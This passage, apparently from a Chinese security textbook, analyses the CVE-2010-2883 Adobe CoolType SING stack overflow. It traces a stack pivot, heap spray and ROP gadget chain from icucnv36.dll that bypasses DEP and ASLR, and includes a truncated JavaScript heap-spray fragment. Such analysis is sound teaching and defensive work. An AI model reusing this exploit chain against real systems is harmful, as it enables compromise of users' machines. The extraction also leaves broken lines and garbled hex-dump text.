d esp:
0012E4E4 0C 0C 0C 0C BC 94 B0 83 45 A2 04 7D 13 4B 30 18
....紨𤾀E?}K0
0012E4F4 98 95 ED 9F 3E CC 50 8B AC FE B5 5C 8F 86 D5 26
槙𫠆>蘌嫭\弪?
于是跳转到 4A82A714 ：
4A82A714 5C pop esp ; esp = 0C0C0
C0C
4A82A715 C3 retn ; esp = 0C0C0
C10, eip = 4A8063A5
在进入下面的内容前，我们再来看一个东西，即 eax 是由 edi 控
制的，通过对函数调用的回溯，可以看到程序对 edi 的处理，它的值在
整个过程中都是不变的，而且 edi+0x3C 正好存放第一个 gadget 的
地址。所以只要这个地址被覆盖，就可以控制 EIP 了。
d edi+0x3C:
0012E754 D0 E6 12 00 00 00 00 00 00 AA 04 08 00
00 00 00 墟......?.... 
Heap spray
上面的 gadget 返回后，堆栈就被转移到 heap spray 的地方
了。
Heap spray 是在 shellcode 的前面加上大量的 slide
code（滑板指令），组成一个注入代码段。然后向系统申请大量内
存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大
量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使
得程序执行到堆上，最终将导致 shellcode 的执行。
我们来实际看一下（加粗的地方是后面会用到的 gadgets 地
址）：
0C0C0BE0 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C
0C 0C 0C 0C ................ e糥
0C0C0DB0 93 1D F5 42 F0 18 4F F8 C2 D7 4E 28
1B 17 FC 15 ?魾?O撰(?
0C0C0DC0 94 EA FC 52 12 15 8B AA 61 A8 8C 68
18 76 18 6B 旉黂嫪a▽hvk
0C0C0DD0 BA FD BA 57 3B D1 5D 13 37 9E 2A 7B
5B 21 FE F7 糊篧;裖7?{[!
0C0C0DE0 67 AA 01 D8 EE E8 25 FC AB AB 44 A5
11 1D 78 B5 g?仡?獶?x
0C0C0DF0 FA C2 DC BD 16 16 6D 9C 7C E9 E3 9A
32 E9 FB A4 芙m渱殂?辂
0C0C0E00 62 82 CA 2F ED D5 D2 E5 4A 29 99 A4
FA A2 44 3D b偸/碚义J)櫎D=
0C0C0E10 BF AE 76 EB 83 D6 F4 1E 7B 2D E4 6A
7E 69 A2 87 慨v雰拄{-鋔~i
0C0C0E20 F2 E2 47 A8 A1 03 42 CB 24 90 0E 22
C3 10 B4 3A 蜮GāB??"??
0C0C0E30 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C
0C 0C 0C 0C ................ 
通过 PDFStreamDumper 可以看到内嵌的 JavaScript，将
变量还原后代码如下：
1643
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
var shellcode = unescape( '%u4141%u4141%u63a5%u4a
80%u0000 ...省略大量字符... a1%ucb42%u9024%u220e%u1
0c3%u3ab4' );
var rop = unescape( "%u0c0c%u0c0c" );
while (rop.length + 20 + 8 
4A801F91 C3 retn ; esp
= 0C0C0C24, eip = 4A80B692
4A80B692 - FF20 jmp dword ptr ds:[eax
] ; kernel32.CreateFileA
调用函数 kernel32.CreateFileW 创建文件，各参数如下所
示：
0C0C0C04 7FFDFC00 |FileName = "iso88591"
0C0C0C08 10000000 |Access = GENERIC_ALL
0C0C0C0C 00000000 |ShareMode = 0
0C0C0C10 00000000 |pSecurity = NULL
0C0C0C14 00000002 |Mode = CREATE_ALWAYS
0C0C0C18 00000102 |Attributes = HIDDEN|TEMPORA
RY
0C0C0C1C 00000000 \hTemplateFile = NULL
然后通过同样的方法调用 CreateFileMapping ：
4A8063A5 59 pop ecx ; esp
= 0C0C0C4C, ecp = 4A801064
4A8063A6 C3 retn ; esp
= 0C0C0C50, eip = 4A842DB2
1645
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
4A842DB2 97 xchg eax,edi
4A842DB3 C3 retn ; esp
= 0C0C0C54, eip = 4A802AB1
4A802AB1 5B pop ebx ; esp
= 0C0C0C58, ebx = 00000008
4A802AB2 C3 retn ; esp
= 0C0C0C5C, eip = 4A80A8A6
4A80A8A6 213C5C and dword ptr ss:[esp
+ebx*2],edi
4A80A8A9 75 03 jnz short icucnv36.4A
80A8AE
4A80A8AB B0 01 mov al,0x1
4A80A8AD C3 retn
4A80A8A6 213C5C and dword ptr ss:[esp
+ebx*2],edi
...
4A80A8C8 32C0 xor al,al
4A80A8CA C3 retn ; esp
= 0C0C0C60, eip = 4A801F90
4A801F90 58 pop eax ; esp
= 0C0C0C64, eax = 4A849038 
4A801F91 C3 retn ; esp
= 0C0C0C68, eip = 4A80B692
1646
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
4A80B692 - FF20 jmp dword ptr ds:[eax
] ; kernel32.CreateFileMappingA
调用函数 kernel32.CreateFileMappingW 创建内存映射，
各参数如下所示：
0C0C0C40 000003D4 |hFile = 000003D4
0C0C0C44 00000000 |pSecurity = NULL
0C0C0C48 00000040 |Protection = PAGE_EXECUTE_R
EADWRITE
0C0C0C4C 00000000 |MaximumSizeHigh = 0x0
0C0C0C50 00010000 |MaximumSizeLow = 0x10000
0C0C0C54 00000000 \MapName = NULL
接下来是调用 MapViewOfFile 的过程：
4A8063A5 59 pop ecx ; esp
= 0C0C0C8C, ecx = 4A801064
4A8063A6 C3 retn ; esp
= 0C0C0C90, eip = 4A842DB2
4A842DB2 97 xchg eax,edi
4A842DB3 C3 retn ; esp
= 0C0C0C94, eip = 4A802AB1
1647
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
4A802AB1 5B pop ebx ; esp
= 0C0C0C98, ebx = 00000008
4A802AB2 C3 retn ; esp
= 0C0C0C9C, eip = 4A80A8A6
4A80A8A6 213C5C and dword ptr ss:[esp
+ebx*2],edi
...
4A80A8C8 32C0 xor al,al
4A80A8CA C3 retn ; esp
= 0C0C0CA0, eip = 4A801F90
4A801F90 58 pop eax ; esp
= 0C0C0CA4, eax = 4A849030 
4A801F91 C3 retn ; esp
= 0C0C0CA8, eip = 4A80B692
4A80B692 - FF20 jmp dword ptr ds:[eax
] ; kernel32.MapViewOfFile
调用函数 kernel32.MapViewOfFileEx 将文件映射到内存映
射地址空间，各参数如下所示：
1648
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
0C0C0C8C 000003D8 |hMapObject = 000003D8
0C0C0C90 00000022 |AccessMode = 0x22
0C0C0C94 00000000 |OffsetHigh = 0x0
0C0C0C98 00000000 |OffsetLow = 0x0
0C0C0C9C 00010000 |MapSize = 10000 (65536.)
0C0C0CA0 00000000 \BaseAddr = NULL
最后调用函数 memcpy 将真正的 shellcode 复制到
MapViewOfFile 返回的地址处。这是一段可读可写可执行的
内存，从而绕过 DEP。另外由于所使用的 gadgets 都来自
icucnv36.dll 模块，该模块不受 ASLR 的影响，所以同时
也相当于绕过了 ASLR。
4A8063A5 59 pop ecx ; esp
= 0C0C0CC8, ecx = 4A8A0004
4A8063A6 C3 retn ; esp
= 0C0C0CCC, eip = 4A802196
4A802196 8901 mov dword ptr ds:[ecx
],eax
4A802198 C3 retn ; esp
= 0C0C0CD0, eip = 4A8063A5
4A8063A5 59 pop ecx ; esp
= 0C0C0CD4, ecx = 4A801064
4A8063A6 C3 retn ; esp
= 0C0C0CD8, eip = 4A842DB2
1649
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
4A842DB2 97 xchg eax,edi
4A842DB3 C3 retn ; esp
= 0C0C0CDC, eip = 4A802AB1
4A802AB1 5B pop ebx ; esp
= 0C0C0CE0, ebx = 00000030
4A802AB2 C3 retn ; esp
= 0C0C0CE4, eip = 4A80A8A6
4A80A8A6 213C5C and dword ptr ss:[esp
+ebx*2],edi
...
4A80A8C8 32C0 xor al,al
4A80A8CA C3 retn ; esp
= 0C0C0CE8, eip = 4A801F90
4A801F90 58 pop eax ; esp
= 0C0C0CEC, eax = 4A8A0004
4A801F91 C3 retn ; esp
= 0C0C0CF0, eip = 4A80A7D8
4A80A7D8 8B00 mov eax,dword ptr ds:
[eax]
4A80A7DA C3 retn ; esp
= 0C0C0CF4, eip = 4A8063A5
1650
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
4A8063A5 59 pop ecx ; esp
= 0C0C0CF8, ecx = 4A801064
4A8063A6 C3 retn ; esp
= 0C0C0CFC, eip = 4A842DB2